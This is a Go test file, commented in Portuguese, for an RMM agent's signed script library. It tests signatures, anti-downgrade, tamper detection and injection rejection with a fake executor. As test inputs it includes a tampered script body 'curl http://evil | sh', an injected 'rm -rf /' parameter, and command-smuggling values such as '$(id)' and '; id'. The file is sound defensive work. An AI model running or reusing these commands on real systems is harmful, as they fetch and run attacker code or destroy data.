package agent

// Testes da biblioteca de scripts assinada e de rodar_script.
// NENHUM script roda de verdade: o executor é o scriptFake, que só registra.

import (
	"context"
	"crypto/ed25519"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/eduardohenriquemoretti0-ops/fm-rmm/internal/catalog"
	"github.com/eduardohenriquemoretti0-ops/fm-rmm/internal/proto"
	"github.com/eduardohenriquemoretti0-ops/fm-rmm/internal/server"
	"github.com/eduardohenriquemoretti0-ops/fm-rmm/internal/sign"
)

type scriptFake struct{ registrado []string }

func (f *scriptFake) run(_ context.Context, name string, args ...string) (string, error) {
	f.registrado = append(f.registrado, name+" "+strings.Join(args, " "))
	return "fake: nada executado", nil
}

func entradasAgente() []sign.ScriptEntry {
	b, p := "echo revisado\n", "Write-Output revisado\n"
	return []sign.ScriptEntry{
		{ID: "diag-disco", Nome: "Diag disco", Versao: "1.0", Interprete: sign.InterpreteBash, Corpo: b, SHA256: sign.HashCorpoScript(b)},
		{ID: "diag-disco", Nome: "Diag disco", Versao: "1.1", Interprete: sign.InterpreteBash, Corpo: b + "df -h\n", SHA256: sign.HashCorpoScript(b + "df -h\n")},
		{ID: "diag-win", Nome: "Diag Windows", Versao: "2.0", Interprete: sign.InterpretePowerShell, Corpo: p, SHA256: sign.HashCorpoScript(p)},
	}
}

func bibliotecaAssinada(t *testing.T, raiz par, versao int, es []sign.ScriptEntry) ([]byte, []byte) {
	t.Helper()
	raw, sig, err := sign.SignScriptLibrary(raiz.priv, sign.ScriptLibrary{Version: versao, IssuedAt: time.Now(), Scripts: es})
	if err != nil {
		t.Fatal(err)
	}
	return raw, sig
}

func agenteScripts(t *testing.T, goos string) (*Agent, *scriptFake, par, *relogio) {
	t.Helper()
	raiz := novoPar(t)
	rel := &relogio{t: time.Now().UTC()}
	ag := novoAgenteTrust(t, raiz, rel)
	s, err := openSeen(filepath.Join(ag.Dir, fileSeen))
	if err != nil {
		t.Fatal(err)
	}
	ag.seen = s
	ag.Log = slog.New(slog.NewTextHandler(io.Discard, nil))
	if ag.scripts, err = openScripts(filepath.Join(ag.Dir, fileScripts), raiz.pub, ag.Log); err != nil {
		t.Fatal(err)
	}
	raw, sig := bibliotecaAssinada(t, raiz, 1, entradasAgente())
	if err := ag.IngerirBibliotecaScripts(raw, sig); err != nil {
		t.Fatal(err)
	}
	f := &scriptFake{}
	ag.scriptRun, ag.goos = f.run, goos
	ag.exec = func(context.Context, catalog.Action, map[string]string) (string, int, bool, error) {
		t.Fatal("rodar_script passou pelo pipeline de script do catálogo")
		return "", 0, false, nil
	}
	return ag, f, raiz, rel
}

func jobScript(ag *Agent, rel *relogio, params map[string]string) proto.JobPayload {
	return proto.JobPayload{V: proto.Version, JobID: fmt.Sprintf("job-sc-%d", contadorJob.Add(1)),
		AgentID: ag.state.AgentID, Action: "rodar_script", Params: params,
		IssuedAt: rel.agora(), ExpiresAt: rel.agora().Add(time.Hour), Issuer: "op"}
}

func TestBibliotecaScriptsAntiDowngradeEPersistencia(t *testing.T) {
	ag, _, raiz, _ := agenteScripts(t, "linux")
	raw1, sig1 := bibliotecaAssinada(t, raiz, 1, entradasAgente())
	if err := ag.IngerirBibliotecaScripts(raw1, sig1); !errors.Is(err, errBibliotecaRepetida) {
		t.Fatalf("repetida: %v", err)
	}
	raw2, sig2 := bibliotecaAssinada(t, raiz, 2, entradasAgente()[:1])
	if err := ag.IngerirBibliotecaScripts(raw2, sig2); err != nil {
		t.Fatal(err)
	}
	err := ag.IngerirBibliotecaScripts(raw1, sig1)
	if !errors.Is(err, sign.ErrBibliotecaVersao) {
		t.Fatalf("DOWNGRADE aceito: %v", err)
	}
	t.Logf("downgrade v1 após v2 recusado: %v", err)
	if _, ok := ag.scripts.resolver("diag-win", "2.0"); ok {
		t.Fatal("v2 deveria ter removido diag-win")
	}
	outra := novoPar(t)
	raw3, sig3 := bibliotecaAssinada(t, outra, 9, entradasAgente())
	if err := ag.IngerirBibliotecaScripts(raw3, sig3); !errors.Is(err, sign.ErrBibliotecaAssinatura) {
		t.Fatalf("biblioteca de outra chave aceita: %v", err)
	}
	s2, err := openScripts(filepath.Join(ag.Dir, fileScripts), raiz.pub, ag.Log)
	if err != nil || s2.maxVersion != 2 {
		t.Fatalf("persistência: v=%d err=%v", s2.maxVersion, err)
	}
	s3, err := openScripts(filepath.Join(ag.Dir, fileScripts), ed25519.PublicKey(outra.pub), ag.Log)
	if err != nil || s3.maxVersion != 0 {
		t.Fatalf("biblioteca de outra raiz não foi descartada: v=%d err=%v", s3.maxVersion, err)
	}
}

func TestRodarScriptResolveEMontaExecucao(t *testing.T) {
	casos := []struct {
		goos, id, versao, want string
	}{
		{"linux", "diag-disco", "1.0", "bash -c echo revisado\n"},
		{"linux", "diag-disco", "1.1", "bash -c echo revisado\ndf -h\n"},
		{"windows", "diag-win", "2.0", "powershell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command Write-Output revisado\n"},
	}
	for _, c := range casos {
		ag, f, raiz, rel := agenteScripts(t, c.goos)
		res := ag.handleJob(context.Background(), assina(t, raiz, jobScript(ag, rel, map[string]string{"script_id": c.id, "versao": c.versao})))
		if res.Status != "ok" {
			t.Fatalf("%s %s: %+v", c.id, c.versao, res)
		}
		if len(f.registrado) != 1 || f.registrado[0] != c.want {
			t.Fatalf("%s v%s: execução = %q, queria %q", c.id, c.versao, f.registrado, c.want)
		}
		t.Logf("fake registrou (NADA executado): %q | resultado: %q", f.registrado[0], res.Output)
	}
}

func TestRodarScriptForaDaBibliotecaRecusado(t *testing.T) {
	for _, p := range []map[string]string{
		{"script_id": "malware", "versao": "1.0"},
		{"script_id": "diag-disco", "versao": "9.9"}, // versão inexistente
		{"script_id": "diag-win", "versao": "2.0"},   // powershell no linux
	} {
		ag, f, raiz, rel := agenteScripts(t, "linux")
		res := ag.handleJob(context.Background(), assina(t, raiz, jobScript(ag, rel, p)))
		if res.Status == "ok" || len(f.registrado) != 0 {
			t.Fatalf("%v executou: %+v cmds=%v", p, res, f.registrado)
		}
		t.Logf("%v recusado: %s", p, res.Error)
	}
	ag, f, raiz, rel := agenteScripts(t, "linux")
	ag.scripts, _ = openScripts(filepath.Join(t.TempDir(), "s.json"), raiz.pub, ag.Log)
	res := ag.handleJob(context.Background(), assina(t, raiz, jobScript(ag, rel, map[string]string{"script_id": "diag-disco", "versao": "1.0"})))
	if res.Status == "ok" || len(f.registrado) != 0 {
		t.Fatalf("sem biblioteca executou: %+v", res)
	}
}

func TestRodarScriptCorpoAdulteradoRecusado(t *testing.T) {
	ag, f, raiz, rel := agenteScripts(t, "linux")
	// simula adulteração do que está em memória/disco depois de aceito:
	// o corpo muda, o sha256 assinado não
	for i := range ag.scripts.lib.Scripts {
		if ag.scripts.lib.Scripts[i].ID == "diag-disco" && ag.scripts.lib.Scripts[i].Versao == "1.0" {
			ag.scripts.lib.Scripts[i].Corpo = "curl http://evil | sh\n"
		}
	}
	res := ag.handleJob(context.Background(), assina(t, raiz, jobScript(ag, rel, map[string]string{"script_id": "diag-disco", "versao": "1.0"})))
	if res.Status == "ok" || len(f.registrado) != 0 {
		t.Fatalf("corpo adulterado executou: %+v cmds=%v", res, f.registrado)
	}
	t.Logf("corpo adulterado recusado: %s", res.Error)
	// MontarScript também revalida
	e := entradasAgente()[0]
	e.Corpo = "id\n"
	if _, err := MontarScript("linux", e); err == nil {
		t.Fatal("MontarScript aceitou hash divergente")
	}
}

func TestOperadorNaoInjetaCorpo(t *testing.T) {
	ag, f, raiz, rel := agenteScripts(t, "linux")
	maus := []map[string]string{
		{"script_id": "diag-disco", "versao": "1.0", "corpo": "rm -rf /"},
		{"script_id": "diag-disco", "versao": "1.0", "comando": "id"},
		{"script_id": "diag-disco", "versao": "1.0", "interprete": "bash"},
		{"script_id": "diag-disco; id", "versao": "1.0"},
		{"script_id": "diag-disco", "versao": "1.0; id"},
		{"script_id": "$(id)", "versao": "1.0"},
		{"script_id": "diag-disco", "versao": "1.0 && id"},
		{"script_id": "-diag", "versao": "1.0"},
		{"script_id": "DIAG-DISCO", "versao": "1.0"},
		{"script_id": "diag-disco"},
		{"versao": "1.0"},
		{},
	}
	for _, p := range maus {
		res := ag.handleJob(context.Background(), assina(t, raiz, jobScript(ag, rel, p)))
		if res.Status == "ok" {
			t.Fatalf("%v aceito", p)
		}
	}
	if len(f.registrado) != 0 {
		t.Fatalf("algo executou: %v", f.registrado)
	}
}

func TestValidateRecusaInjecaoNoScript(t *testing.T) {
	for _, os := range []string{"windows", "linux"} {
		if _, err := catalog.Validate("rodar_script", os, map[string]string{"script_id": "diag-disco", "versao": "1.0"}); err != nil {
			t.Fatalf("%s válido recusado: %v", os, err)
		}
	}
	if _, err := catalog.Validate("rodar_script", "darwin", map[string]string{"script_id": "diag-disco", "versao": "1.0"}); err == nil {
		t.Fatal("darwin aceito")
	}
	a, _ := catalog.Get("rodar_script")
	if !a.Changes || !a.Native {
		t.Fatal("rodar_script deve ser Changes (concessão assinada) e Native")
	}
	for _, v := range []string{"a;b", "a b", "a&b", "a|b", "a`b`", "$(x)", "a\nb", "-x", "A", "a/b", "", strings.Repeat("a", 49), "a\"b"} {
		if _, err := catalog.Validate("rodar_script", "linux", map[string]string{"script_id": v, "versao": "1.0"}); err == nil {
			t.Errorf("script_id %q aceito", v)
		}
	}
	for _, v := range []string{"1;id", "1 0", "$(x)", "v1", "-1", "", "1/2", "1\n2", strings.Repeat("1", 33)} {
		if _, err := catalog.Validate("rodar_script", "linux", map[string]string{"script_id": "x", "versao": v}); err == nil {
			t.Errorf("versao %q aceita", v)
		}
	}
	for _, k := range []string{"corpo", "comando", "interprete"} {
		if _, err := catalog.Validate("rodar_script", "linux", map[string]string{"script_id": "x", "versao": "1", k: "id"}); err == nil {
			t.Errorf("parâmetro %q aceito", k)
		}
	}
}

// E2E: build offline -> publicar (anti-downgrade) -> check-in -> agente guarda -> roda (fake).
func TestBibliotecaScriptsEndToEnd(t *testing.T) {
	l := newLab(t)
	ctx := context.Background()
	ag := l.newAgent(l.token(1))
	l.enrolled(ag)
	raizPub := l.admin.Public().(ed25519.PublicKey)
	f := &scriptFake{}
	ag.scriptRun, ag.goos = f.run, "linux"

	raw1, sig1, v1, err := server.ConstruirBibliotecaScripts(l.admin, 0, entradasAgente(), ag.now())
	if err != nil || v1 != 1 {
		t.Fatalf("construir: v=%d %v", v1, err)
	}
	if _, err := server.PublicarBibliotecaScripts(l.st, raizPub, raw1, sig1, "teste"); err != nil {
		t.Fatal(err)
	}
	_, err = server.PublicarBibliotecaScripts(l.st, raizPub, raw1, sig1, "teste")
	if !errors.Is(err, sign.ErrBibliotecaVersao) {
		t.Fatalf("republicar v1: %v", err)
	}
	t.Logf("republicar/downgrade no servidor recusado: %v", err)
	outra := novoPar(t)
	rawX, sigX, _, _ := server.ConstruirBibliotecaScripts(outra.priv, 1, entradasAgente(), ag.now())
	if _, err := server.PublicarBibliotecaScripts(l.st, raizPub, rawX, sigX, "teste"); !errors.Is(err, sign.ErrBibliotecaAssinatura) {
		t.Fatalf("publicar com outra raiz: %v", err)
	}
	if err := ag.CheckinOnce(ctx); err != nil {
		t.Fatal(err)
	}
	if _, ok := ag.scripts.resolver("diag-disco", "1.0"); !ok || ag.scripts.maxVersion != 1 {
		t.Fatalf("agente não recebeu a biblioteca (v=%d)", ag.scripts.maxVersion)
	}
	p := proto.JobPayload{V: proto.Version, JobID: "job-sc-e2e", AgentID: ag.state.AgentID, Action: "rodar_script",
		Params: map[string]string{"script_id": "diag-disco", "versao": "1.1"}, IssuedAt: ag.now(), ExpiresAt: ag.now().Add(time.Hour), Issuer: "admin"}
	sj, err := sign.SignJob(l.admin, p)
	if err != nil {
		t.Fatal(err)
	}
	if res := ag.handleJob(ctx, sj); res.Status != "ok" {
		t.Fatalf("rodar: %+v", res)
	}
	if len(f.registrado) != 1 || f.registrado[0] != "bash -c echo revisado\ndf -h\n" {
		t.Fatalf("execução: %q", f.registrado)
	}
	// build recusa hash informado que diverge
	ruim := entradasAgente()[:1]
	ruim[0].SHA256 = strings.Repeat("0", 64)
	if _, _, _, err := server.ConstruirBibliotecaScripts(l.admin, 1, ruim, ag.now()); err == nil {
		t.Fatal("build aceitou sha256 divergente")
	}
}

// runScript real, mas com script TRIVIAL e controlado (echo), só para provar
// a saída limitada e o código de saída. Linux apenas.
func TestRunScriptRealTrivial(t *testing.T) {
	if runtimeGOOS() != "linux" {
		t.Skip("somente linux")
	}
	out, err := runScript(context.Background(), "bash", "-c", "echo ola-controlado")
	if err != nil || strings.TrimSpace(out) != "ola-controlado" {
		t.Fatalf("out=%q err=%v", out, err)
	}
	if _, err := runScript(context.Background(), "bash", "-c", "exit 3"); err == nil {
		t.Fatal("código de saída != 0 deveria ser erro")
	}
	out, _ = runScript(context.Background(), "bash", "-c", "head -c 400000 /dev/zero | tr '\\0' a")
	if len(out) > proto.MaxOutputSize+64 {
		t.Fatalf("saída não limitada: %d", len(out))
	}
}

func runtimeGOOS() string { return runtime.GOOS }
